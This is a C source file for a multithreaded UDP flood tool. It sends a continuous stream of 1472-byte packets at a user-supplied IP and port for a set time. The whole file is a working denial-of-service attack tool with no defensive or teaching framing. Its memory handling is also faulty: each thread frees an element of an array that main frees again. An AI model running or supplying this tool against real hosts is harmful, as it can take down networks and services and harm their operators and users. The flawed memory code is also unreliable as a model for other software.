#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <errno.h>

#define PACKET_SIZE 1472 // Experiment with this.  Consider smaller sizes if fragmentation is an issue.
#define DEFAULT_PORT 80 // Default port if none is provided
#define DEFAULT_THREADS 10 // Default thread count
#define DEFAULT_DURATION 10 // Default duration in seconds

typedef struct {
    struct sockaddr_in server;
    time_t end_time;
    int sock;
} ThreadArgs;

void *udp_flood(void *arg) {
    ThreadArgs *args = (ThreadArgs *)arg;
    char payload[PACKET_SIZE];
    memset(payload, 'A', PACKET_SIZE);

    while (time(NULL) < args->end_time) {
        ssize_t bytes_sent = sendto(args->sock, payload, PACKET_SIZE, 0, (struct sockaddr *)&args->server, sizeof(args->server));
        if (bytes_sent < 0) {
            if (errno != EWOULDBLOCK) {
                perror("sendto failed");
                // Consider breaking the loop or adjusting packet size if errors persist.
            }
        }
    }

    close(args->sock);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    char *ip_address = NULL;
    int port = DEFAULT_PORT;
    int threads = DEFAULT_THREADS;
    int duration = DEFAULT_DURATION;

    // Parse command-line arguments with error checking
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <IP> [Port] [Threads] [Time (seconds)]\n", argv[0]);
        return 1;
    }
    ip_address = argv[1];

    if (argc > 2) {
        port = atoi(argv[2]);
        if (port <= 0 || port > 65535) {
            fprintf(stderr, "Invalid port number. Using default: %d\n", DEFAULT_PORT);
            port = DEFAULT_PORT;
        }
    }
    if (argc > 3) {
        threads = atoi(argv[3]);
        if (threads <= 0) {
            fprintf(stderr, "Invalid thread count. Using default: %d\n", DEFAULT_THREADS);
            threads = DEFAULT_THREADS;
        }
    }
    if (argc > 4) {
        duration = atoi(argv[4]);
        if (duration <= 0) {
            fprintf(stderr, "Invalid duration. Using default: %d\n", DEFAULT_DURATION);
            duration = DEFAULT_DURATION;
        }
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    if (inet_pton(AF_INET, ip_address, &server.sin_addr) <= 0) {
        perror("inet_pton failed");
        return 1;
    }

    printf("Starting UDP flood on %s:%d for %d seconds using %d threads.\n",
           ip_address, port, duration, threads);

    pthread_t thread_pool[threads];
    ThreadArgs *args_array = (ThreadArgs *)malloc(threads * sizeof(ThreadArgs)); // Allocate an array to store args
    if (!args_array) {
        perror("malloc failed for args_array");
        return 1;
    }
    memset(args_array, 0, threads * sizeof(ThreadArgs)); // Initialize the array

    int thread_count = 0; // Keep track of the number of successfully created threads

    for (int i = 0; i < threads; i++) {
        ThreadArgs *args = &args_array[i]; // Use the pre-allocated args
        args->server = server;
        args->end_time = time(NULL) + duration;

        args->sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (args->sock < 0) {
            perror("socket creation failed");
            continue; // Skip this thread
        }

        int sndbuf_size = 65536;
        if (setsockopt(args->sock, SOL_SOCKET, SO_SNDBUF, &sndbuf_size, sizeof(sndbuf_size)) < 0) {
            perror("setsockopt (SO_SNDBUF) failed");
            // It's not critical, so continue.
        }

        if (pthread_create(&thread_pool[i], NULL, udp_flood, args) != 0) {
            perror("pthread_create failed");
            close(args->sock);
            continue; // Skip this thread
        }
        thread_count++; // Increment the counter if thread creation was successful
    }

    // Join only the successfully created threads
    for (int i = 0; i < thread_count; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    free(args_array); // Free the allocated array
    printf("UDP flood completed.\n");
    return 0;
}
